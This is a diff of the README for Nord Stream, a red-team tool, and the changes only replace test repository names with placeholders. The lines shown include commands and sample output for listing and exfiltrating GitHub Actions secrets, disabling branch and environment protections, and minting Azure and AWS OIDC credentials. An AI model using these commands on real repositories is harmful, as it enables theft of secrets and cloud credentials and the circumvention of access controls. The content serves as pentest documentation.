@@ -48,9 +48,9 @@ $ pip3 install -r requirements.txt
 
 Here is a simple example on GitHub; initially, one can enumerate the various secrets.
 ```sh
-$ nord-stream.py github --token "$GHP" --org s1n-cicd-tests --list-secrets --repo TestCICD
+$ nord-stream.py github --token "$GHP" --org org --list-secrets --repo repo
 [*] Listing secrets:
-[*] "s1n-cicd-tests/TestCICD" secrets
+[*] "org/repo" secrets
 [*] Repo secrets:
         - REPO_SECRET
         - SUPER_SECRET
@@ -60,10 +60,10 @@ $ nord-stream.py github --token "$GHP" --org s1n-cicd-tests --list-secrets --rep
 
 Then proceed to the exfiltration:
 ```sh
-python3 nord-stream.py github --token "$GHP" --org s1n-cicd-tests --repo TestCICD  
-[+] "s1n-cicd-tests/TestCICD"
+python3 nord-stream.py github --token "$GHP" --org org --repo repo  
+[+] "org/repo"
 [*] No branch protection rule found on "dev_remote_ea5Eu/test/v1" branch
-[*] Getting secrets from repo: "s1n-cicd-tests/TestCICD"
+[*] Getting secrets from repo: "org/repo"
 [*] Getting workflow output
 [!] Workflow not finished, sleeping for 15s
 [+] Workflow has successfully terminated.
@@ -71,7 +71,7 @@ python3 nord-stream.py github --token "$GHP" --org s1n-cicd-tests --repo TestCIC
 secret_SUPER_SECRET=value for super secret
 secret_REPO_SECRET=repository secret
 
-[*] Getting secrets from environment: "PROD" (s1n-cicd-tests/TestCICD)
+[*] Getting secrets from environment: "PROD" (org/repo)
 [*] Getting workflow output
 [!] Workflow not finished, sleeping for 15s
 [+] Workflow has successfully terminated.
@@ -105,7 +105,7 @@ $ nord-stream.py github --token "$PAT" --describe-token
 The `--build-yaml` option can be used to create a pipeline file without deploying it. It retrieves the various secret names to build the associated pipeline, which can be used to add custom steps:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --env PROD --build-yaml custom.yml
+$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --env PROD --build-yaml custom.yml
 [+] YAML file:
 name: GitHub Actions
 'on': push
@@ -141,8 +141,8 @@ jobs:
 ```
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --yaml custom.yml
-[+] "synacktiv/TestCICD"
+$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --yaml custom.yml
+[+] "synacktiv/repo"
 [*] No branch protection rule found on "dev_remote_ea5Eu/test/v1"branch
 [*] Running custom workflow: .../custom.yml
 [*] Getting workflow output
@@ -162,7 +162,7 @@ $ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --yaml cu
 By default, it will display the output of the task named `command` of the `init` job, but everything is stored locally and can be access manually:
 
 ```bash
-$ cat nord-stream-logs/github/synacktiv/TestCICD/workflow_custom_2023-07-18_22-08-44/init/4_last\ step.txt
+$ cat nord-stream-logs/github/synacktiv/repo/workflow_custom_2023-07-18_22-08-44/init/4_last\ step.txt
 2023-07-18T20:08:33.0458509Z ##[group]Run echo "Hello from last step "
 2023-07-18T20:08:33.0459084Z echo "Hello from last step "
 2023-07-18T20:08:33.0511473Z shell: /usr/bin/bash -e {0}
@@ -191,10 +191,10 @@ uid                 [ultimate] test-gpg <test.gpg@cicd.local>
 ```
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --branch-name main  --key-id F94496913C43EFC5 --user test-gpg --email test.gpg@cicd.local --force
+$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --branch-name main  --key-id F94496913C43EFC5 --user test-gpg --email test.gpg@cicd.local --force
 [*] Using branch: "main"
-[+] "synacktiv/TestCICD"
-[*] Getting secrets from environment: "prod" (synacktiv/TestCICD)
+[+] "synacktiv/repo"
+[*] Getting secrets from environment: "prod" (synacktiv/repo)
 [*] Getting workflow output
 [!] Workflow not finished, sleeping for 15s
 [+] Workflow has successfully terminated.
@@ -294,9 +294,9 @@ Authors: @hugow @0hexit
 The `--list-protections` option can be used to list the protections applied to a branch and to environments:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --branch-name main --list-protections
+$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --branch-name main --list-protections
 [*] Using branch: "main"
-[*] Checking security: "synacktiv/TestCICD"
+[*] Checking security: "synacktiv/repo"
 [*] Found branch protection rule on "main" branch
 [*] Branch protections:
         - enforce admins: True
@@ -324,13 +324,13 @@ Depending on your permissions, you can have less information, only administrator
 The `--disable-protections` option can be used to temporarily disable the protections applied to a branch or an environment, realize the dump and restore all the protections:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --branch-name main --no-repo --no-org --env prod --disable-protections
+$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --branch-name main --no-repo --no-org --env prod --disable-protections
 [*] Using branch: "main"
-[+] "synacktiv/TestCICD"
+[+] "synacktiv/repo"
 [*] Found branch protection rule on "main" branch
 [...]
 [!] Removing branch protection, wait until it's restored.
-[*] Getting secrets from environment: "prod" (synacktiv/TestCICD)
+[*] Getting secrets from environment: "prod" (synacktiv/repo)
 [*] Environment protection for: "PROD":
         - deployment branch policy: custom
 [!] Modifying env protection, wait until it's restored.
@@ -373,9 +373,9 @@ If you come across such a workflow, this means that the repository might be conf
 Nord Stream is able to deploy a pipeline to retrieve such access token with the following options:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --branch-name main --azure-client-id 65cd6002-25b9-11ee-88ac-7f80b19430c2 --azure-tenant-id 65cd6002-25b9-11ee-88ac-7f80b19430c2
+$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --branch-name main --azure-client-id 65cd6002-25b9-11ee-88ac-7f80b19430c2 --azure-tenant-id 65cd6002-25b9-11ee-88ac-7f80b19430c2
 [*] Using branch: "main"
-[+] "synacktiv/TestCICD"
+[+] "synacktiv/repo"
 [*] No branch protection rule found on "main" branch
 [*] Running OIDC Azure access tokens generation workflow
 [*] Getting workflow output
@@ -427,8 +427,8 @@ If you come across such a workflow, this means that the repository might be conf
 Nord Stream is able to deploy a pipeline to retrieve such access token with the following options:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --aws-role 'arn:aws:iam::133333333337:role/S3Access/CustomRole' --aws-region us-east-1 --force
-[+] "Synacktiv/TestCICD"
+$ nord-stream.py github --token "$PAT" --org Synacktiv --repo repo --aws-role 'arn:aws:iam::133333333337:role/S3Access/CustomRole' --aws-region us-east-1 --force
+[+] "Synacktiv/repo"
 [*] Running OIDC AWS credentials generation workflow
 [*] Getting workflow output
 [!] Workflow not finished, sleeping for 15s
